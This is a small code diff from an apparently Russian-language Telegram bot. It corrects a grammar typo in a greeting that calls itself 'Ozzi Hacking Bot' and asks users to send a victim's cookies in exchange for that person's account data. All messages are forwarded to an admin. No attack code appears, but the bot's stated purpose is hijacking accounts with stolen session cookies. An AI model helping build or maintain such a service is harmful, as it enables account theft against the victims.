@@ -19,7 +19,7 @@ async def forward_to_admin(message: Message):
     
     if user_id not in replied_users:
         replied_users.add(user_id)  # Запоминаем пользователя
-        await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")
+        await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунта тебе :)")
     
     # Пересылаем админу всегда (если ADMIN_ID указан)
     if ADMIN_ID:
